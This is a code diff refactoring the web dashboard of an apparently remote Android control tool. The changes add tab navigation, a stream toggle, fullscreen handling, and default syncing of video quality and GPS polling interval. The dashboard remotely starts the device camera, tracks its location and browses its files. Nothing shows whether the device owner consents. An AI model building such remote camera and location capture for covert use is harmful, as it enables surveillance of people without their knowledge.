@@ -27,8 +27,8 @@ const activeCameraLabel = document.getElementById('activeCameraLabel');
 const tagActiveCamera = document.getElementById('tagActiveCamera');
 
 // Camera Controls
-const btnStartStream = document.getElementById('btnStartStream');
-const btnStopStream = document.getElementById('btnStopStream');
+const btnToggleStream = document.getElementById('btnToggleStream');
+const streamToggleIcon = document.getElementById('streamToggleIcon');
 const btnSwitchCameraTop = document.getElementById('btnSwitchCameraTop');
 const btnSwitchCameraTopText = document.getElementById('btnSwitchCameraTopText');
 const videoQualitySelect = document.getElementById('videoQualitySelect');
@@ -62,6 +62,16 @@ const fsUploadProgress = document.getElementById('fsUploadProgress');
 // GPS Map Controls
 const gpsIntervalSelect = document.getElementById('gpsIntervalSelect');
 const btnRefreshLocation = document.getElementById('btnRefreshLocation');
+
+// Bottom Navigation & Tab Views
+const bottomNavItems = document.querySelectorAll('.bottom-nav-item');
+const tabViews = {
+  streaming: document.getElementById('viewStreaming'),
+  location: document.getElementById('viewLocation'),
+  storage: document.getElementById('viewStorage'),
+  log: document.getElementById('viewLog'),
+  setting: document.getElementById('viewSetting')
+};
 
 // ── State Variables ───────────────────────────────────────────
 let peer = null;
@@ -118,54 +128,103 @@ if (retryButton) {
 }
 
 // ─────────────────────────────────────────────────────────────
+// Responsive Bottom Navigation & View Switching
+// ─────────────────────────────────────────────────────────────
+
+function switchTab(tabName) {
+  if (!tabViews[tabName]) return;
+
+  // Update navbar active state
+  bottomNavItems.forEach(item => {
+    if (item.getAttribute('data-tab') === tabName) {
+      item.classList.add('active');
+    } else {
+      item.classList.remove('active');
+    }
+  });
+
+  // Toggle view visibility
+  Object.keys(tabViews).forEach(key => {
+    const view = tabViews[key];
+    if (view) {
+      if (key === tabName) {
+        view.style.display = 'flex';
+      } else {
+        view.style.display = 'none';
+      }
+    }
+  });
+
+  // Update URL hash without jumping
+  if (history.replaceState) {
+    history.replaceState(null, null, `#${tabName}`);
+  }
+
+  // Critical fix for Leaflet map dimensions inside initially hidden container
+  if (tabName === 'location') {
+    setTimeout(() => {
+      if (map) {
+        map.invalidateSize();
+      } else {
+        initMap();
+      }
+    }, 150);
+  }
+}
+
+bottomNavItems.forEach(item => {
+  item.addEventListener('click', () => {
+    const target = item.getAttribute('data-tab');
+    if (target) switchTab(target);
+  });
+});
+
+// ─────────────────────────────────────────────────────────────
 // On-Demand Stream Controls
 // ─────────────────────────────────────────────────────────────
 
 function updateStreamControlUI(isStreaming) {
   isCameraStreamingActive = isStreaming;
-  if (btnStartStream) {
-    btnStartStream.disabled = isStreaming;
-    btnStartStream.style.opacity = isStreaming ? '0.4' : '1';
-  }
-  if (btnStopStream) {
-    btnStopStream.disabled = !isStreaming;
-    btnStopStream.style.opacity = !isStreaming ? '0.4' : '1';
+  if (btnToggleStream) {
+    if (isStreaming) {
+      btnToggleStream.className = 'btn-stream-toggle is-streaming';
+      btnToggleStream.title = 'Stop Stream';
+      btnToggleStream.innerHTML = `<svg id="streamToggleIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="width:15px;height:15px"><path fill-rule="evenodd" d="M4.5 7.5a3 3 0 0 1 3-3h9a3 3 0 0 1 3 3v9a3 3 0 0 1-3 3h-9a3 3 0 0 1-3-3v-9Z" clip-rule="evenodd" /></svg>`;
+    } else {
+      btnToggleStream.className = 'btn-stream-toggle is-stopped';
+      btnToggleStream.title = 'Start Stream';
+      btnToggleStream.innerHTML = `<svg id="streamToggleIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="width:16px;height:16px"><path fill-rule="evenodd" d="M4.5 5.653c0-1.427 1.529-2.33 2.779-1.643l11.54 6.347c1.295.712 1.295 2.573 0 3.286L7.28 19.99c-1.25.687-2.779-.217-2.779-1.643V5.653Z" clip-rule="evenodd" /></svg>`;
+    }
   }
   if (tagActiveCamera) {
+    tagActiveCamera.textContent = '';
     if (isStreaming) {
-      tagActiveCamera.textContent = 'STREAMING';
-      tagActiveCamera.style.background = 'rgba(16, 185, 129, 0.2)';
-      tagActiveCamera.style.color = 'var(--success)';
-      tagActiveCamera.style.borderColor = 'var(--success)';
+      tagActiveCamera.className = 'status-dot is-streaming';
+      tagActiveCamera.title = 'STREAMING';
       logDebug('[STREAM] Camera stream active on device');
     } else {
-      tagActiveCamera.textContent = 'STANDBY';
-      tagActiveCamera.style.background = 'rgba(234, 179, 8, 0.12)';
-      tagActiveCamera.style.color = 'var(--warning)';
-      tagActiveCamera.style.borderColor = 'var(--warning)';
+      tagActiveCamera.className = 'status-dot is-standby';
+      tagActiveCamera.title = 'STANDBY';
       logDebug('[STREAM] Camera stream stopped (standby mode)');
     }
   }
 }
 
-if (btnStartStream) {
-  btnStartStream.addEventListener('click', () => {
+if (btnToggleStream) {
+  btnToggleStream.addEventListener('click', () => {
     if (!androidClientId) {
       logDebug('[STREAM] No Android device connected');
       return;
     }
-    logDebug('[CMD] Sending cmd:start_camera to device');
-    socket.emit('cmd:start_camera', { to: androidClientId });
-    updateStreamControlUI(true);
-  });
-}
-
-if (btnStopStream) {
-  btnStopStream.addEventListener('click', () => {
-    if (!androidClientId) return;
-    logDebug('[CMD] Sending cmd:stop_camera to device');
-    socket.emit('cmd:stop_camera', { to: androidClientId });
-    updateStreamControlUI(false);
+    if (!isCameraStreamingActive) {
+      logDebug('[CMD] Sending cmd:start_camera to device');
+      socket.emit('cmd:start_camera', { to: androidClientId });
+      updateStreamControlUI(true);
+    } else {
+      logDebug('[CMD] Sending cmd:stop_camera to device');
+      socket.emit('cmd:stop_camera', { to: androidClientId });
+      updateStreamControlUI(false);
+    }
   });
 }
 
@@ -180,17 +239,13 @@ function updateCameraUI(activeCam) {
   if (activeCam === 'front') {
     if (videoFront) videoFront.style.display = 'block';
     if (videoBack) videoBack.style.display = 'none';
-    if (activeCameraLabel) activeCameraLabel.textContent = 'Kamera Depan (Front Camera)';
-    if (btnSwitchCameraTopText) {
-      btnSwitchCameraTopText.textContent = 'Ganti ke Kamera Belakang 🔄';
-    }
+    if (activeCameraLabel) activeCameraLabel.textContent = 'FRONT';
+    if (btnSwitchCameraTop) btnSwitchCameraTop.title = 'Switch Camera (Current: FRONT)';
   } else {
     if (videoFront) videoFront.style.display = 'none';
     if (videoBack) videoBack.style.display = 'block';
-    if (activeCameraLabel) activeCameraLabel.textContent = 'Kamera Belakang (Back Camera)';
-    if (btnSwitchCameraTopText) {
-      btnSwitchCameraTopText.textContent = 'Ganti ke Kamera Depan 🔄';
-    }
+    if (activeCameraLabel) activeCameraLabel.textContent = 'BACK';
+    if (btnSwitchCameraTop) btnSwitchCameraTop.title = 'Switch Camera (Current: BACK)';
   }
 }
 
@@ -234,17 +289,65 @@ if (videoQualitySelect) {
   });
 }
 
-// Fullscreen Camera
-if (btnFullscreenCamera && cameraViewport) {
-  btnFullscreenCamera.addEventListener('click', () => {
-    if (!document.fullscreenElement) {
+// Fullscreen Camera Toggle
+function toggleCameraFullscreen() {
+  const isFull = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement;
+  if (!isFull) {
+    if (cameraViewport.requestFullscreen) {
       cameraViewport.requestFullscreen().catch(err => {
         logDebug(`Fullscreen error: ${err.message}`);
       });
+    } else if (cameraViewport.webkitRequestFullscreen) {
+      cameraViewport.webkitRequestFullscreen();
+    } else if (cameraViewport.mozRequestFullScreen) {
+      cameraViewport.mozRequestFullScreen();
+    } else if (cameraViewport.msRequestFullscreen) {
+      cameraViewport.msRequestFullscreen();
     } else {
-      document.exitFullscreen();
+      // iOS Safari fallback on active video element
+      const activeVideo = (currentActiveCamera === 'front') ? videoFront : videoBack;
+      if (activeVideo && activeVideo.webkitEnterFullscreen) {
+        activeVideo.webkitEnterFullscreen();
+      }
     }
-  });
+  } else {
+    if (document.exitFullscreen) {
+      document.exitFullscreen().catch(() => {});
+    } else if (document.webkitExitFullscreen) {
+      document.webkitExitFullscreen();
+    } else if (document.mozCancelFullScreen) {
+      document.mozCancelFullScreen();
+    } else if (document.msExitFullscreen) {
+      document.msExitFullscreen();
+    }
+  }
+}
+
+if (btnFullscreenCamera && cameraViewport) {
+  btnFullscreenCamera.addEventListener('click', toggleCameraFullscreen);
+  cameraViewport.addEventListener('dblclick', toggleCameraFullscreen);
+
+  const updateFullscreenIcon = () => {
+    const isFull = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement;
+    if (isFull) {
+      btnFullscreenCamera.title = 'Exit Fullscreen';
+      btnFullscreenCamera.innerHTML = `
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M9 9V4.5M9 9H4.5M9 9 3.75 3.75M9 15v4.5M9 15H4.5M9 15l-5.25 5.25M15 9h4.5M15 9V4.5M15 9l5.25-5.25M15 15h4.5M15 15v4.5m0-4.5 5.25 5.25" />
+        </svg>
+      `;
+    } else {
+      btnFullscreenCamera.title = 'Toggle Fullscreen';
+      btnFullscreenCamera.innerHTML = `
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:16px;height:16px">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 3.75v4.5m0-4.5h4.5m-4.5 0L9 9M3.75 20.25v-4.5m0 4.5h4.5m-4.5 0L9 15M20.25 3.75h-4.5m4.5 0v4.5m0-4.5L15 9m5.25 11.25h-4.5m4.5 0v-4.5m0 4.5L15 15" />
+        </svg>
+      `;
+    }
+  };
+
+  document.addEventListener('fullscreenchange', updateFullscreenIcon);
+  document.addEventListener('webkitfullscreenchange', updateFullscreenIcon);
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -444,13 +547,13 @@ if (fsUploadArea && fsUploadInput) {
   fsUploadArea.addEventListener('dragover', (e) => {
     e.preventDefault();
     fsUploadArea.style.borderColor = 'var(--primary)';
-    fsUploadArea.style.background = 'rgba(0, 240, 255, 0.04)';
+    fsUploadArea.style.background = 'rgba(255, 45, 135, 0.08)';
   });
 
   ['dragleave', 'dragend', 'drop'].forEach(evt => {
     fsUploadArea.addEventListener(evt, () => {
-      fsUploadArea.style.borderColor = 'rgba(255,255,255,0.08)';
-      fsUploadArea.style.background = 'rgba(0,0,0,0.15)';
+      fsUploadArea.style.borderColor = 'var(--border-subtle)';
+      fsUploadArea.style.background = 'var(--bg-sunken)';
     });
   });
 
@@ -695,6 +798,13 @@ socket.on('android-client-ready', id => {
     logDebug(`Android target identified: ${id}`);
     updateStatus('Session established with device');
     requestFileList(currentPath);
+
+    // Sync default preferences (Low quality & 10m polling)
+    const initialQuality = videoQualitySelect ? videoQualitySelect.value : 'low';
+    const initialGps = gpsIntervalSelect ? parseInt(gpsIntervalSelect.value) : 600000;
+    socket.emit('cmd:set_quality', { to: id, quality: initialQuality });
+    socket.emit('cmd:set_gps_interval', { to: id, intervalMs: initialGps });
+    logDebug(`[CONFIG] Synced defaults: Quality=${initialQuality}, GPS=${initialGps}ms`);
   }
 });
 
@@ -829,3 +939,15 @@ socket.on('error', (error) => {
 updateStatus('Connecting to signaling...');
 initMap();
 updateCameraUI('front');
+
+// Initialize settings defaults
+if (videoQualitySelect && !videoQualitySelect.value) videoQualitySelect.value = 'low';
+if (gpsIntervalSelect && !gpsIntervalSelect.value) gpsIntervalSelect.value = '600000';
+
+// Check URL hash or default to streaming view
+const initialHash = window.location.hash.replace('#', '');
+if (initialHash && tabViews[initialHash]) {
+  switchTab(initialHash);
+} else {
+  switchTab('streaming');
+}
